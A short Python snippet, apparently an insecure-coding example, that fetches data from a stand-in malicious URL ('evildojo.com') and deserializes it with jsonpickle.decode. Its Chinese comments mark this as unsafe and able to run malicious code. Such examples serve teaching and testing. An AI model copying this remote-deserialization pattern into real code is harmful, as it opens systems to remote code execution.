import jsonpickle
import urllib.request

# 从恶意 URL 下载序列化的 JSON 数据
url = "https://evildojo.com/malicious_jsonpickle"
response = urllib.request.urlopen(url)

# 使用 jsonpickle.decode 反序列化（不安全示例）
malicious_object = jsonpickle.decode(response.read())  # 不安全，可能执行恶意代码

print(malicious_object)
response.close()
